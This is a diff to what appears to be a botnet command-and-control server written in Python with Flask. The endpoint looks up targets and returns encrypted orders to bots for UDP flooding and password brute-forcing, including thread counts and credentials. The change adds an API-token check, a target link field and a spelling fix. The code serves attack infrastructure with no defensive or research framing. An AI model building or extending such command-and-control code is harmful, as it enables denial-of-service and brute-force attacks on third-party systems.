@@ -215,8 +215,10 @@ def BotNet(target_name):
     if request.method == 'GET':
         try:
             data = decrypt_payload(request.args)
-
             token = data.get('token')
+            api_token = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
+            if len(api_token) == 0:
+                return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
             botNets = getlist(_session.query(APILink).filter_by(target_name=target_name).all())
             response = {'botNets': {}}
             for botNet in botNets:
@@ -228,14 +230,16 @@ def BotNet(target_name):
                 if botNet[4] == config.ACTION_TYPE[0]: # udp-flood
                     response['botNets'] = {
                         config.ACTION_TYPE[0]: {
-                            'conditon': config.BOTNET_STATUS[1],
+                            'link': botNet[3],
+                            'condition': config.BOTNET_STATUS[1],
                             'threads': botNet[7]
                         }
                     }
                 elif botNet[4] == config.ACTION_TYPE[2]: # brutForce
                     response['botNets'] = {
                         config.ACTION_TYPE[0]: {
-                            'conditon': config.BOTNET_STATUS[1],
+                            'link': botNet[3],
+                            'condition': config.BOTNET_STATUS[1],
                             'threads': botNet[7],
                             'username': botNet[8], # filled name
                             'password': botNet[9]  # filled name
